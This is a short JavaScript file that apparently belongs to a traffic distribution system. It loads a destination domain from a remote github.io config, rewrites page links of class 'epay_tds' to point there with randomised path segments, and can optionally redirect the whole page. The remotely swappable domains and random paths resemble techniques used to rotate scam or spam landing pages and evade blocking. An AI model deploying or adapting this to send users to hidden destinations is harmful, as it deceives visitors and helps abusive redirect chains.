getTdsDef();

function getTdsDef(){

    var xmlhttp_def = new XMLHttpRequest();
    xmlhttp_def.open("GET", "https://act-tobacco.github.io/com/tel.txt", true);
    xmlhttp_def.send();

    xmlhttp_def.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            proccess_main_urls(this.responseText);
        }
    };
}

function proccess_main_urls(data) {
    var data = JSON.parse(data);
    var tds_domain = data.tds_domain;
    var elem = document.getElementsByTagName("a");
    var gStr = strGen(13 + Math.ceil(Math.random() * 10));
    tds_domain = tds_domain.substring(0, tds_domain.length - 1);
    //if((typeof(redirect) != "undefined") && (redirect == true)) { 
    //    window.location = data.tds_domain + elem[0].pathname+ elem[0].search; return true; 
    //}

    if(!(isEmpty(elem)))
    {
        for (var j = 0; j < elem.length; j++) {
            if(elem[j].className.indexOf("epay_tds") > -1){
                
                if((typeof(redirect) != "undefined") && (redirect == true)) { 
                 window.location = data.tds_domain + elem[j].pathname+ elem[j].search; return true; 
                }

                pathname_current =  elem[j].pathname+'/'+gStr+'/';
                get_params = elem[j].search;
                elem[j].href = tds_domain + pathname_current + get_params;
               
            }
        }

    }
}

function isEmpty(obj) {
    if (obj.length == 0)
    {
        return true;
    }
    else{return false;}
}

function strGen(strLen) {
    var resStr = '';
    var symArray = ['q','w','e','r','t','y','u','i','o','p','a','s','d','f','g','h','j','k','l','z','x','c','v','b','n','m','0','1','2','3','4','5','6','7','8','9'];
    while(resStr.length < strLen) {
        resStr = resStr + symArray[Math.ceil((Math.random() * symArray.length) - 1)];
    }
    return resStr;
}

